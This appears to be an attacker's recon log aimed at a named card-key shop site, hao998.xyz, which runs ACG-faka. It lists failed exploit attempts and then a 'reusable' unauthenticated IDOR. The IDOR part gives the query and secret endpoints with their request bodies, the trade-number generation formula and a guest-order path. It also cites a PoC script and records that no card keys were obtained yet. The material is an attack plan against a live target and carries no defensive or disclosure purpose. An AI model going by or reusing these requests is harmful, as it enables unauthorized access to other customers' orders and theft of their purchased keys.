# SUCCESS_CASES → hao998.xyz（ACG-faka）

Source: `/data/recon/exports/SUCCESS_CASES.md`

| Case | Result |
|------|--------|
| qd93 substring query | **N/A**（非彩虹） |
| Rainbow ajax dump | **N/A** `/shop/ajax.php` 404 |
| 79yj `%61pi` search | **N/A** 404 |
| tools apikey | **N/A** 404 |
| YKFAKA null | **N/A** |

## New reusable case（本站确认）

### ACG-faka unauth query/secret IDOR

- `POST /user/api/index/query` body `keywords=<tradeNo|contact>`
- `POST /user/api/index/secret` body `orderId=<tradeNo>&password=`
- tradeNo: `mt_rand(100,999)+ymdHis+mt_rand(100,999)`（18 位）
- Guest trade: `POST /user/api/order/trade` with `pay_id` = Xunhupay

**kami_obtained: false**（缺他人 tradeNo/contact；空间不可暴力）

PoC script: `scripts/hao998_idor_poc.py`
